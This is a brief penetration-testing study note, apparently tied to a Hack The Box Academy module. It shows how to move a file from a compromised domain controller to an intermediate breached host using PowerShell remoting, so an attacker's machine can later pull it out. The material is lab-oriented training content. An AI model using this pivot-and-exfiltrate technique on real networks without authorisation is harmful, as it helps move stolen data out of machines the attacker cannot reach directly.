Note: This method is very useful if, our destination machine cannot be touched by our attacking host but is touchable by another intermittent host we have breached, Example: DC01<-->DATABASE01<-->Kali, but DC01<--xx-->Kali

From DC01: 

```
Test-NetConnection -ComputerName DATABASE01 -Port 5985 #Test Connection
```

```
$Session = New-PSSession -ComputerName DATABASE01 #get new session on DB01
```

```
Copy-Item -Path <abspath_to_file> -ToSession $Session -Destination <abspath_on_target> #copy file from DC01 to DB01
```

Then, on DB01, we can use whatever method we wish to copy required file back to our machine

Ref: https://academy.hackthebox.com/app/module/24/section/161